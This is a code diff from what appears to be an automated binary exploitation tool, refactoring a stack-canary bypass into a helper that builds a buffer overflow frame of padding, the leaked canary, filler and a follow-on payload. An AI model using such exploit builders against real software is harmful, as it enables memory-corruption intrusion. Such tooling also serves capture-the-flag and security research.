@@ -88,16 +88,33 @@ class CanaryStrategy(ExploitStrategy):
             b'B' * c.diff + payload_after_canary``.
         """
         c: CanaryInfo = ctx.canary
-        if ctx.binary.bit == 64:
-            canary_bytes = p64(c.value)
-        else:
-            canary_bytes = p32(c.value)
-        return (
-            b"A" * ctx.padding
-            + canary_bytes
-            + b"B" * c.diff
-            + payload_after_canary
+        return build_canary_frame(
+            ctx.binary.bit,
+            ctx.padding,
+            c.value,
+            c.diff,
+            payload_after_canary,
         )
 
 
-__all__ = ["CanaryStrategy"]
+def build_canary_frame(
+    bit: int,
+    padding: int,
+    canary_value: int,
+    diff: int,
+    payload_after_canary: bytes,
+) -> bytes:
+    """Build ``[A * padding][canary][B * diff][tail]`` for x32/x64."""
+    if bit == 64:
+        canary_bytes = p64(canary_value)
+    else:
+        canary_bytes = p32(canary_value)
+    return (
+        b"A" * padding
+        + canary_bytes
+        + b"B" * diff
+        + payload_after_canary
+    )
+
+
+__all__ = ["CanaryStrategy", "build_canary_frame"]
